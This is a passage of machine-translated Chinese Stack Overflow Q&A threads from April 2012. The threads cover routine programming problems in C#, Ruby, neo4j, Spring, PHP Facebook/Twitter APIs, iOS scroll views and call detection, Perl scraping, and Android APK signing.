        public boolean onTouchEvent(MotionEvent event) {
            LayoutParams layoutParms = (LayoutParams)(childView.getLayoutParams());
            layoutParms.leftMargin=100;
            layoutParms.topMargin=100;

            parentView.requestLayout();
            parentView.invalidate();

            return super.onTouchEvent(event);

        }

    } 
```

# c# - 从 URL 读取 XML 时出现 C# 错误

> ID：10102060
> 
> 赞同：3
> 
> 时间：2012-04-11T08:00:46.393
> 
> 标签：c#, xml

我有一个 XML 阅读器，但是当我尝试从 URL（外部源）读取 XML 时收到错误消息。

这是我有 ATM 的代码：

```
XmlReader xmlReader = XmlReader.Create("http://dl.bukkit.org/api/1.0/downloads/projects/craftbukkit/view/build-1330/");
        while (xmlReader.Read())
        {

        } 
```

非常简单的代码，但它返回一个错误，上面写着：

> 根级别的数据无效。第 1 行，位置 1。

任何的想法？
我无法编辑 XML，因为它不是我的。

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T08:13:56.790

如果您使用[Fiddler](http://www.fiddler2.com/fiddler2/)分析服务器返回的响应，您会看到，您得到的是 JSON 而不是 XML。您可以在 URL 中添加参数以获取 XML：

```
http://dl.bukkit.org/api/1.0/downloads/projects/craftbukkit/view/build-1330/?format=xml 
```

# ruby - 如何使用neography限制neo4j遍历的结果

> ID：10102067
> 
> 赞同：1
> 
> 时间：2012-04-11T08:01:11.913
> 
> 标签：ruby, ruby-on-rails-3, neo4j, traversal, neography

如果这是一个简单的问题，我深表歉意，但我求助于 SO 的智慧来让我克服这个问题 :)

我将 RoR 3.1.1 与neography gem 一起使用。

我目前有一个人节点的neo4j图，关系为连接它们的“朋友”。给定一个特定人的节点，我想一次翻阅他们朋友的朋友（2 度节点）的结果 5 个。现在，我使用以下遍历代码一次获取所有朋友的朋友（它可能需要很长时间，以至于会导致超时）：

```
 nodes = @neo.traverse(user_node,"nodes", {"order" => "breadth first",
                                          "uniqueness" => "node global",
                                          "relationships" => {"type"=> "friends", "direction" => "all"},
                                          "return filter" => {
                                            "language" => "javascript",
                                            "body" => 
                                            "position.length() == 2;"},
                                          "depth" => 2}) 
```

从 neo4j 网站（[http://docs.neo4j.org/chunked/stable/rest-api-traverse.html#rest-api-creating-a-paged-traverser](http://docs.neo4j.org/chunked/stable/rest-api-traverse.html#rest-api-creating-a-paged-traverser)），看起来已经有这样的东西了分页遍历，但我没有从neography 中看到任何关于这样做的参考。

有人可以提供示例代码来说明如何在可能的情况下使用neography 执行此操作，如果需要，如何在没有neography 的情况下执行此操作，或者诸如限制从我已经在执行的示例遍历返回的结果数量之类的解决方法？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T21:00:24.347

您能否为此使用 Cypher 查询，[http://docs.neo4j.org/chunked/snapshot/cypher-query-lang.html](http://docs.neo4j.org/chunked/snapshot/cypher-query-lang.html)，例如

```
START n = node(0) Match n-[:friends]->()-[:friends]->fof RETURN fof SKIP 0 LIMIT 5 
```

前 5 位朋友？

# sharepoint - Sharepoint 2010 - 为新文档库指定默认设置和列

> ID：10102071
> 
> 赞同：0
> 
> 时间：2012-04-11T08:01:28.150
> 
> 标签：sharepoint, sharepoint-2010

如何为新文档库指定模板，在该模板中创建新库时使用了一些预设设置，例如启用了修订，并且一些默认列包含在默认视图中，例如版本和签入。

我正在考虑在网站集级别执行此操作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T13:00:16.553

有两个基本选项：

1.  通过浏览器，您可以按照您想要的方式自定义文档库，然后通过选择设置 > 文档库设置 > 将文档库另存为模板将其保存为自定义列表模板。

2.  在 Visual Studio 中，您可以创建包含自定义列表定义的功能。有关更多信息，请参阅[如何：创建自定义列表定义](http://msdn.microsoft.com/en-us/library/ms466023.aspx)。要启用版本，请在[List 元素](http://msdn.microsoft.com/en-us/library/ms415091.aspx)上设置 VersioningEnabled 和可能的 EnableMinorVersions 属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T12:57:09.567

您可以通过 Visual Studio 创建自己的 ListDefinition。列表定义将包括列表、列、视图的所有可能的内容类型。如果需要，您还可以配置自己的网站栏。然后为网站集级别配置您的功能并使用它=）

为了使这个过程更容易尝试为内容类型创建 ListDefinition 并选择一个内容类型。（在你的情况下，我想它会是文档）

# ruby - 非宝石的 $LOAD_PATH 的 ruby 约定是什么？

> ID：10102072
> 
> 赞同：0
> 
> 时间：2012-04-11T08:01:30.320
> 
> 标签：ruby

我在一个 ruby​​ 项目中有一些代码。据我了解，库代码应该位于 lib 文件夹中。

所以我有

```
/lib
    /mymodule.rb
    /mymodule
        /somefile.rb 
```

我一直在通过调用 require 'relative/path/to/lib/mymodule.rb' 来使用这个内部库。所有这些库代码到 $LOAD_PATH 的最佳实践是什么？我只想说

```
require 'mymodule' 
```

而不是直接要求文件。

在过去的 30 分钟里，我一直在谷歌上搜索，最好的做法/惯例是什么并不明显。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:08:52.707

您可以使用`require_relative`，如果您移动文件可能会有点混乱，因此会稍微不稳定。或设置 `$LOAD_PATH`在项目的启动/初始化文件中。请注意在这种情况下使用您自己的子文件夹以避免名称与您的 gem 冲突。

# blackberry - 我们可以监控黑莓中的任何应用程序吗？

> ID：10102079
> 
> 赞同：2
> 
> 时间：2012-04-11T08:01:49.797
> 
> 标签：blackberry

我们可以在黑莓iefor 中监控任何正在运行的应用程序吗？例如，如果我想知道是否有5 个正在运行的应用程序并且我想知道哪个应用程序正在使用相机功能或Wi-Fi 等，那么这怎么可能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:29:51.783

不，这是不可能的。没有 API 可用于监控您描述的此类参数。

# javascript - Javascript。如何检测 window.document 何时更改？

> ID：10102088
> 
> 赞同：0
> 
> 时间：2012-04-11T08:02:09.600
> 
> 标签：javascript, window, document

window.document 经常安静地更改，例如，当您从一个 url 移动到另一个 url 或调用 document.reload(true); 时

文档本身有一个完美的 readyState 和一个用于跟踪任何更改的 readystatechange 事件。但是，如果您将 addEventListener 放入文档以获取 readyState 事件并且文档被更新，则 addEventListener 将不再存在，并且永远不会调用该方法。

所以我喜欢在每次文档在窗口对象中更新时附加一个。那么有没有办法检测到呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:07:02.983

您必须在每个网页中都存在您自己的 javascript，以便脚本可以在每个页面加载时重新安装事件处理程序，或者您必须通过可以监控每个页面加载的浏览器插件来执行此操作。

根据定义，当加载新页面时，页面中的所有脚本都会被清除，因此不可能让一个页面中的脚本存活到下一页。

另一个想法：如果所有感兴趣的页面都在同一个域和您的域上，则可能有一个父框架定期监视子框架并在每次文档更改时不断重置其上的事件处理程序。但是，由于同源策略安全限制，这只有在所有帧都在同一个域上时才有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:44:34.107

如果您的目标是当前浏览器并且不关心旧版支持，请查看 History API，因为它允许您向用户显示正在访问新页面（地址栏中的 URL 更改并出现 back/fwd按预期工作）而不刷新您的 JavaScript 上下文。

在此处查看演示：http: [//html5demos.com/history](http://html5demos.com/history)

并在此处阅读更多信息：[https ://developer.mozilla.org/en/DOM/Manipulating_the_browser_history](https://developer.mozilla.org/en/DOM/Manipulating_the_browser_history)

# spring - 使用 Spring 运行测试。--> java.lang.IllegalStateException: 无法加载 ApplicationContext

> ID：10102095
> 
> 赞同：4
> 
> 时间：2012-04-11T08:02:51.687
> 
> 标签：spring

我在运行返回的测试用例时遇到问题`java.lang.IllegalStateException: Failed to load ApplicationContext`。我已经检查过了，`@ContextConfiguration`但它看起来是正确的。

课程：

```
public class MainSecurityInit extends SecurityFunctionalityCbosInit
{

    protected FileWriter logFile = null;
    private String logFileName = "";

    /* _______________________ Initializers ________________________ */
    @Autowired
    private CbosSecurityInit cbosSecurityInit;

    public void doTest()
    {

        Map<Class, Object> map = new HashMap<Class, Object>();
        List<DataBaseInitializerResult> results = null;

        initLogFile();
        try
        {
            // -------------- Begin of initialization ------------------ //
            cbosSecurityInit.execute();
            // -------------- End of initialization -------------------- //
        }
        catch (Throwable ex)
        {
            logger.error(ex.getMessage());
            ex.printStackTrace();
            test(results);
        }
        finally
        {
            closeLogFile();
        }

    }
} 
```

在`SecurityFunctionalityCbosInit`注释中有这些：

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = "security-functionality-cbos-context.xml")
@TransactionConfiguration(transactionManager = "transactionManager", defaultRollback = false)
@Transactional
public abstract class SecurityFunctionalityCbosInit extends AbstractTransactionalJUnit4SpringContextTests{
    //
} 
```

堆栈跟踪：

```
java.lang.IllegalStateException: Failed to load ApplicationContext
    at org.springframework.test.context.TestContext.getApplicationContext(TestContext.java:203)
    at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.injectDependencies(DependencyInjectionTestExecutionListener.java:109)
    at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.prepareTestInstance(DependencyInjectionTestExecutionListener.java:75)
    at org.springframework.test.context.TestContextManager.prepareTestInstance(TestContextManager.java:255)
    at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.createTest(SpringJUnit4ClassRunner.java:93)
    at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.invokeTestMethod(SpringJUnit4ClassRunner.java:130)
    at org.junit.internal.runners.JUnit4ClassRunner.runMethods(JUnit4ClassRunner.java:51)
    at org.junit.internal.runners.JUnit4ClassRunner$1.run(JUnit4ClassRunner.java:44)
    at org.junit.internal.runners.ClassRoadie.runUnprotected(ClassRoadie.java:27)
    at org.junit.internal.runners.ClassRoadie.runProtected(ClassRoadie.java:37)
    at org.junit.internal.runners.JUnit4ClassRunner.run(JUnit4ClassRunner.java:42)
    at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:49)
    at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:467)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:683)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:390)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:197)
Caused by: java.lang.IllegalStateException: Autowired annotation requires at least one argument: public void com.arcadia.security.MainSecurityInit.doTest()
    at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$2.doWith(AutowiredAnnotationBeanPostProcessor.java:307)
    at org.springframework.util.ReflectionUtils.doWithMethods(ReflectionUtils.java:466)
    at org.springframework.util.ReflectionUtils.doWithMethods(ReflectionUtils.java:443)
    at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.findAutowiringMetadata(AutowiredAnnotationBeanPostProcessor.java:299)
    at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessMergedBeanDefinition(AutowiredAnnotationBeanPostProcessor.java:179)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyMergedBeanDefinitionPostProcessors(AbstractAutowireCapableBeanFactory.java:745)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:448)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
    at java.security.AccessController.doPrivileged(Native Method)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
    at org.springframework.test.context.support.AbstractGenericContextLoader.loadContext(AbstractGenericContextLoader.java:96)
    at org.springframework.test.context.support.AbstractGenericContextLoader.loadContext(AbstractGenericContextLoader.java:44)
    at org.springframework.test.context.TestContext.loadApplicationContext(TestContext.java:173)
    at org.springframework.test.context.TestContext.getApplicationContext(TestContext.java:199)
    ... 16 more 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T08:08:28.427

您要自动装配的属性没有设置器 ( `cbosSecurityInit`)。在stacktrace中，有一条原因信息：Autowired annotation requires at least one argument: public void。

# matlab - 关于在matlab中读取视频帧的内存问题

> ID：10102096
> 
> 赞同：0
> 
> 时间：2012-04-11T08:02:56.277
> 
> 标签：matlab, memory, frame

我正在尝试在给定的视频中使用 mmreader 函数读取帧数，但 matlab 给出错误提示

> ？？？没有足够的内存可用于 1515 帧。
> 
> 我试过使用命令**clear all** and **clear**但这个问题是一致的，有人可以帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T07:02:26.097

Matlab 32 位在其矩阵的最大大小方面受到限制。使用视频，您会经常触摸它。

您使用的是 32 位还是 64 位？

# php - Facebook - 通过 Cronjob 获取用户访问令牌

> ID：10102099
> 
> 赞同：0
> 
> 时间：2012-04-11T08:03:04.363
> 
> 标签：php, facebook, facebook-graph-api

是否可以通过 cronjob 为用户获取有效的访问令牌？我想创建一个应用程序，每天晚上解析用户的所有帖子并检查是否有一些特殊字符。

使用应用程序访问密钥，我只能访问用户的公共帖子。使用用户访问令牌，我还可以访问私人帖子

但用户访问令牌过期

是否可以使用 cronjob 刷新用户令牌？这意味着 cronjob 可能必须刷新 100 个用户访问令牌，并且我没有让用户 du 打开授权对话框，因为它通过 cronjob 在服务器上调用

我正在为 facebook api 使用 php

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:11:31.127

不，这是不可能的，它甚至在官方[删除 offline_access 权限](http://developers.facebook.com/roadmap/offline-access-removal/)帖子中明确表示：

> 用户必须先访问您的应用程序，然后您才能获得有效的“授权码”才能再次进行服务器端 OAuth 调用。应用程序将无法设置尝试自动延长过期时间的**后台/cron 作业**，因为“授权码”是短暂的并且已经过期。

话虽如此，当您从[服务器端身份验证](http://developers.facebook.com/docs/authentication/server-side/)流程中获取访问令牌时，您获得的令牌应该持续一个月，如果您将其持久化，那么您可以在该月使用它。

该月结束后，如果用户没有重新使用您的应用，则访问令牌将过期，您将不得不传递该用户。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-18T04:47:06.093

如果您使用 facebook jdk，您可以使用：`$token = $facebook->getAccessToken();` 然后，保存`$token`到数据库中供 cronjob 使用

```
 $args = array(
                 'access_token'  => $page_info['access_token'], //Offline Access Token From Database
                 'message'       => $_POST['description'],
                 'link'          =>$_POST['link'],
                 'picture'       =>$_POST['image'],
                 'name'          =>$_POST['title']
                 );
    $post_id = $facebook->api("/$page_id/feed","post",$args); 
```

with`$page_id`是粉丝专页的 id 或

```
$post_id = $facebook->api("/me/feed","post",$args); 
```

# c# - XDocument 获取根属性值

> ID：10102104
> 
> 赞同：1
> 
> 时间：2012-04-11T08:03:27.123
> 
> 标签：c#, .net, xml, linq-to-xml, xattribute

如何使用 xDocument 从数据表中的此字符串中获取 title1 的值

```
<Person ActionType = "Update"  Title1="Miss" /> 
```

我尝试了后代，XAttributes 和各种......也许输入是错误的，但

```
XDocument xml = XDocument.Parse(row["XMLTransaction"].ToString());

IEnumerable<XAttribute> query =
from transaction in xml.Root.Elements()
select transaction.Attribute(attribute); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:33:28.590

如果该字符串是您的文字 XML，那么您应该省略该`.Elements()`部分。

使用 XElement 而不是 XDocument 甚至更短：

```
 var xml = XElement.Parse(row["XMLTransaction"].ToString());

 IEnumerable<XAttribute> query = xml.Attributes(); 
```

# objective-c - CTCallCenter - 呼叫事件处理程序 - 处于后台状态

> ID：10102108
> 
> 赞同：3
> 
> 时间：2012-04-11T08:03:46.217
> 
> 标签：objective-c, ios, background, state

关于 Apple 文档，在应用程序暂停时无法处理手机状态： [https ://developer.apple.com/documentation/coretelephony/ctcallcenter](https://developer.apple.com/documentation/coretelephony/ctcallcenter)

> “当它被暂停时，您的应用程序不会收到呼叫事件”

“背景”状态也是如此吗？（因为关于 Apple 文档中描述的状态，背景状态与“暂停”应用程序状态不同）

[https://web.archive.org/web/20140824215114/https://developer.apple.com/library/ios/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/ManagingYourApplicationsFlow/ManagingYourApplicationsFlow.html](https://web.archive.org/web/20140824215114/https://developer.apple.com/library/ios/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/ManagingYourApplicationsFlow/ManagingYourApplicationsFlow.html)

我正在使用以下代码处理电话状态：

```
CTCallCenter *callCenter = [[CTCallCenter alloc] init];

callCenter.callEventHandler=^(CTCall* call)
{

  //call state

}; 
```

我已经在 callEventHandler 块中添加了一个本地通知，以检查当我的应用程序处于后台状态时是否会收到呼叫事件，但是否接缝未执行该块（我的应用程序具有后台支持和所有接收到的事件（通过TCP）在应用程序处于后台时被正确处理）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-11T12:56:11.523

`callEventHandler`当应用程序处于后台时，我所做的所有测试都无法使用。但是，当应用程序在前台时，一切都很好。

套接字有效，因为 iOS 会为您的应用程序处理它并相应地交付包。但为此，您需要创建一个 voip 套接字并添加`voip`到`UIBackgroundModes`您的*App-Info.plist 中*。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-08-30T14:50:09.043

**您将**无法使用`callEventHandler`...

**但是**，根据[apple dev forums中的这个帖子](https://forums.developer.apple.com/message/49839#49839)，您可以`currentCalls`在后台定期检查以确定呼叫是否正在进行中。

这是您应该使用的代码（每秒钟检查一次）：

```
- (void)viewDidLoad {  
    [super viewDidLoad];

    _timer = [NSTimer scheduledTimerWithTimeInterval:1.0 target:self selector:@selector(phoneDetection) userInfo:nil repeats:YES];  
}  

- (void)phoneDetection {
    _callCenter = [[CTCallCenter alloc] init]; // Here is the important part : instanciating a call center each time you want to check !  

    [_callCenter setCallEventHandler:^(CTCall *call) {  
        NSLog(@"Call detected");  
    }];  

    NSLog(@"%@", _callCenter.currentCalls);  
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-11-13T05:46:28.370

我知道有些应用程序会在后台运行无声的音频文件，以防止在 10 分钟不活动后关闭。

蓝牙、位置和音频可以防止应用程序被完全杀死。

我的应用程序能够在后台检测来电和去电，因为该应用程序通过位置更新保持活动状态。我们过去使用过音频/蓝牙。

如果没有某种“keepAlive”方法，操作系统将暂停您的应用程序，直到某些外部刺激重新激活它（推送通知、用户启动等......）

# c# - 在 XNA 中使用 Draw 方法旋转 Texture2D？

> ID：10102113
> 
> 赞同：3
> 
> 时间：2012-04-11T08:03:57.467
> 
> 标签：c#, xna

我有旋转的问题。我知道我可以使用 draw 方法旋转 Texture2D 对象。

我的目标是将纹理旋转 180°。例如，如果我用相机拍摄头部位于底部的人的照片，我希望能够旋转它以使头部再次位于顶部。

这是代码或旋转：

```
spriteBatch.Draw(Texture, Position, null, Color.White, MathHelper.Pi, new Vector2(), 1.0f, SpriteEffects.None, 0f); 
```

旋转工作正常，但我还有另一个问题： ![在此处输入图像描述](../Images/5155dd889634b588405d2d476cec2f2f.png)

如果我在旋转后将纹理添加到位置 0,0，则它不再可见。

**如何旋转或反射对象，以便红点再次位于左上角？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:09:47.463

[http://msdn.microsoft.com/en-us/library/ff433989.aspx](http://msdn.microsoft.com/en-us/library/ff433989.aspx)

```
public void Draw (
     Texture2D texture,
     Vector2 position,
     Nullable<Rectangle> sourceRectangle,
     Color color,
     float rotation,
     Vector2 origin,
     Vector2 scale,
     SpriteEffects effects,
     float layerDepth)

//Using:
var origin = new Vector2()
{
    X = texture.Width / 2,
    Y = texture.Height/ 2
};

spriteBatch.Draw(texture, Vector2.Zero, null, Color.White, MathHelper.Pi, origin, 1f, SpriteEffects.None, 0f)` 
```

# c# - Prism + Modules 使用 WCF 作为数据访问层

> ID：10102114
> 
> 赞同：3
> 
> 时间：2012-04-11T08:03:58.293
> 
> 标签：c#, wpf, wcf, prism

我正在编写一个使用 prism 框架的应用程序 (WPF)。我有一个使用 shellview 的客户。我有一些模块。所以这是不同的项目。每个模块都是一个单独的项目。这些模块由 Unity 加载。

我有以下

```
Solution
 Client
    Modules
    Client ( app )

 Common
    Entities

 Server
    Data
    Web 
```

所以你可以看到我在服务器文件夹下有一个数据项目。在那里你可以找到 edmx。Web 项目是空的，实体项目也是空的。

客户端（应用程序）有一个带有引导程序的 shellview。客户端工作。只有数据访问层必须集成。

进行数据访问的最佳解决方案是什么？WCF，还有别的吗？我们需要为实体使用什么模板。我们如何在所有代码（View/ViewModel）所在的模块中使用该服务？

Pff，我正在寻找和阅读这么多。在stackoverflow上找到了一些主题。但没有一个话题是从头开始的。希望可以有人帮帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T13:15:57.343

我建议您在 .edmx 上生成 POCO 或 STE，并使用存储库模式进行数据库访问。创建一个单独的 WCF 服务项目并调用这些存储库。

您的 Prism 解决方案将有一个带有静态类的代理项目以返回服务对象，并且您的客户端 (Prism) 应用程序将调用 WCF 服务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:23:55.807

也许您可以查看 Calcium SDK (http://calcium.codeplex.com/)，它利用 Prism 模块化应用程序开发以及对 WCF 服务的支持。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T17:56:27.667

如果您熟悉服务器端的 WCF 和 EntityFramework，那么这是要走的路。

为了重用服务生成的代理类，您可以将服务引用保存在您从所有模块引用的公共程序集中。像“基础设施”这样的东西是一个很好的命名约定。

如果您的某个模块需要独特的功能，那么您将服务引用放在该项目上。

**在 WPF clent 的情况下：**首先使用实体​​框架代码并将模型类分离到单独的程序集中，以便您可以在主客户端和模块中重用它们。

**在 silveright 客户端的情况下：** 如果生成服务代理时重复的模型类和命名空间对您来说是一个问题，您可以检查 WCF RIA 服务。请始终记住，您可以使用 Visual Studio 项目文件属性中的 RIA Link 链接两个程序集，一个是 silverlight，一个是 .net。然后您选择的任何服务器端代码文件都可以在客户端上重用。无论您是否使用 WCF 服务，都可以在文件名中使用“共享”后缀（例如：enums.shared.cs）。[你可以在这里](http://msdn.microsoft.com/en-us/library/ee707371%28v=vs.91%29.aspx)和[这里](http://msdn.microsoft.com/en-us/library/ee707344%28v=vs.91%29.aspx)找到更多

希望这有帮助。

# php - 如何在php中解析这个返回值

> ID：10102118
> 
> 赞同：1
> 
> 时间：2012-04-11T08:04:35.580
> 
> 标签：php

我很难解析这个。我知道如何通过这样做来获取 access_credentials 的密钥：$account['twitter']->access_credentials;。

但我似乎无法获得 oauth_token 或 oauth_token_secret。我需要得到这个，以便我可以将它保存到我的会话变量中。

```
[twitter] => stdClass Object
    (
        [id] => 1
        [third_party_uid] => 
        [access_credentials] => {"oauth_token":"xxxx","oauth_token_secret":"xxx","user_id":"1234","screen_name":"user_1"}
        [mds_user_id] => 15
        [type] => 
        [provider] => Twitter
    ) 
```

请帮忙。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T08:07:34.250

这看起来像一个 JSON 字符串。解码它：

```
$credentials = json_decode($account['twitter']->access_credentials, true);
echo $credentials['oauth_token']; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T08:08:00.680

```
$ac = json_decode($twitter->access_credentials);
echo $ac['oauth_token']; 
```

# iphone - UIScrollview 与多个图像和捏缩放

> ID：10102119
> 
> 赞同：2
> 
> 时间：2012-04-11T08:04:35.563
> 
> 标签：iphone, uiscrollview, uiimageview, zooming

我正在尝试在 iPhone 上复制照片应用程序。意思是，一个带有多个图像的滚动视图，每个图像都可以被捏合以放大/缩小。

Apple ScrollViewSuite 示例代码仅处理滚动视图内的 1 个图像。我发现对于多个图像，滚动图像变得不可预测。此外，捏缩放后视图变得不居中。

我在 Stack Overflow 上找到了这个：[Zoom UIScrollView with multiple images](https://stackoverflow.com/questions/2380643/zoom-uiscrollview-with-multiple-images)

但是，我应该在滚动视图委托函数中写什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-05T17:26:10.210

这就是我发现的工作。支持具有分页和缩放的多个图像。享受！

```
#define VIEW_FOR_ZOOM_TAG (1)

@implementation SVViewController

- (void)viewDidLoad {
    [super viewDidLoad];

    UIScrollView *mainScrollView = [[UIScrollView alloc] initWithFrame:self.view.bounds];
    mainScrollView.pagingEnabled = YES;
    mainScrollView.showsHorizontalScrollIndicator = NO;
    mainScrollView.showsVerticalScrollIndicator = NO;

    CGRect innerScrollFrame = mainScrollView.bounds;

    for (NSInteger i = 0; i < 3; i++) {
        UIImageView *imageForZooming = [[UIImageView alloc] initWithImage:[UIImage imageNamed:  
        [NSString stringWithFormat:@"page%d", i + 1]]];
        imageForZooming.tag = VIEW_FOR_ZOOM_TAG;

        UIScrollView *pageScrollView = [[UIScrollView alloc] initWithFrame:innerScrollFrame];
        pageScrollView.minimumZoomScale = 1.0f;
        pageScrollView.maximumZoomScale = 2.0f;
        pageScrollView.zoomScale = 1.0f;
        pageScrollView.contentSize = imageForZooming.bounds.size;
        pageScrollView.delegate = self;
        pageScrollView.showsHorizontalScrollIndicator = NO;
        pageScrollView.showsVerticalScrollIndicator = NO;
        [pageScrollView addSubview:imageForZooming];

        [mainScrollView addSubview:pageScrollView];

        if (i < 2) {
            innerScrollFrame.origin.x += innerScrollFrame.size.width;
        }
    }

    mainScrollView.contentSize = CGSizeMake(innerScrollFrame.origin.x + 
    innerScrollFrame.size.width, mainScrollView.bounds.size.height);

    [self.view addSubview:mainScrollView];
}

- (UIView *)viewForZoomingInScrollView:(UIScrollView *)scrollView {
    return [scrollView viewWithTag:VIEW_FOR_ZOOM_TAG];
}

- (NSUInteger)supportedInterfaceOrientations {
    return UIInterfaceOrientationMaskPortrait;
} 

- (BOOL)shouldAutorotate {
    return NO;
}

@end 
```

# hibernate - Hibernate 组件映射中的继承

> ID：10102124
> 
> 赞同：1
> 
> 时间：2012-04-11T08:04:50.180
> 
> 标签：hibernate, hibernate-mapping

我想在休眠组件中使用继承。

我的课程 ：

```
class SUPERCLASS
{
   private superclassproperty;
}

class SUBCLASS extends SUPERCLASS
{
    private subclassproperty;
} 
```

Hibernate 映射文件的一部分：

```
<component name="xyz" class="SUBCLASS" >
<Property name="subclassproperty" column="column1"/>
<Property name="superclassproperty" column="column2"/>
</component> 
```

现在通过此映射插入数据时，它工作正常。但是在搜索时，它会出现错误，比如**无法通过反射 getter 获取字段值**

请帮忙 ！！！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-03T20:32:26.673

NHibernate 不支持组件继承。请参阅[此](https://stackoverflow.com/a/10438882/625332)答案和[此](https://stackoverflow.com/q/3149050/625332)问题。

# javascript - 如何在 Perl 中运行网页的 Javascript？

> ID：10102125
> 
> 赞同：0
> 
> 时间：2012-04-11T08:04:52.600
> 
> 标签：javascript, perl, web-crawler

> **可能重复：**
> [如何使用 Perl 从使用 JavaScript 动态生成的网页中获取文本？](https://stackoverflow.com/questions/2655034/how-can-i-use-perl-to-grab-text-from-a-web-page-that-is-dynamically-generated-wi)

我对学习 Perl 很感兴趣，刚开始用 Perl 编写一个网络爬虫。在我抓取的页面上，有一个 Javascript 用于对该页面进行投票。只有当我点击投票星时，它才会显示当前页面的投票。所以在爬取过程中，我需要运行 Javascript 并了解页面的当前投票情况。

你有什么建议或例子吗？

谢谢..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T16:24:33.587

您需要将模块[WWW::Scripter](http://p3rl.org/WWW%3a%3aScripter)与[WWW::Scripter::Plugin::JavaScript](http://p3rl.org/WWW%3a%3aScripter%3a%3aPlugin%3a%3aJavaScript)一起使用。

**概要：**

```
#!/usr/bin/perl

use strict;
use warnings;
use WWW::Scripter;

$w = new WWW::Scripter;
$w->use_plugin('JavaScript');  # packaged separately
$w->get('http://some.site.com/that/relies/on/javascript');
$w->eval(' alert("Hello from JavaScript") ');
$w->document->getElementsByTagName('div')->[0]->....
$w->content; # returns the HTML content, possibly modified by scripts 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T08:28:48.127

使用 perl 来驱动实际的浏览器是一种选择（例如[WWW::Mechanize::Firefox](http://p3rl.org/WWW%3a%3aMechanize%3a%3aFirefox)、[WWW::Selenium](http://p3rl.org/WWW%3a%3aSelenium)等）。要在 perl 中实际运行 javascript，请尝试使用[WWW::Scripter](http://p3rl.org/WWW%3a%3aScripter)和[WWW::Scripter::Plugin::JavaScript](http://p3rl.org/WWW%3a%3aScripter%3a%3aPlugin%3a%3aJavaScript)。

# android - 上传到市场时出现 Android 错误：apk 必须使用与前一个相同的证书进行签名

> ID：10102128
> 
> 赞同：0
> 
> 时间：2012-04-11T08:05:12.927
> 
> 标签：android, google-play, code-signing, apk

我正在尝试将应用程序的新 apk 上传到市场。不幸的是，我错过了第一次上传时生成的证书。现在我收到错误

> apk 必须使用与前一个相同的证书进行签名。

